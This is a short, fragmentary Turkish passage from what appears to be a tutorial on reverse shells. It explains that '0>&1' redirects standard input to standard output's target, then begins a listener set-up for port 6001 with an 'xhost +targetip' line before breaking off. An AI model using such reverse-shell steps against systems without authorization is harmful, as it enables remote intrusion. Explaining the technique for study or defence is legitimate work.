...
4. **`0>&1`**: Bu komutun bu kısmı **standart girişi (`stdin`) standart çıkışla (`stdout`) aynı hedefe yönlendirir**.
...
```
Reverse shell'i yakalamak için (6001 numaralı portta dinleyecek) şunu kullanabilirsiniz:
```bash
# Authorize host
xhost +targetip
# Listen
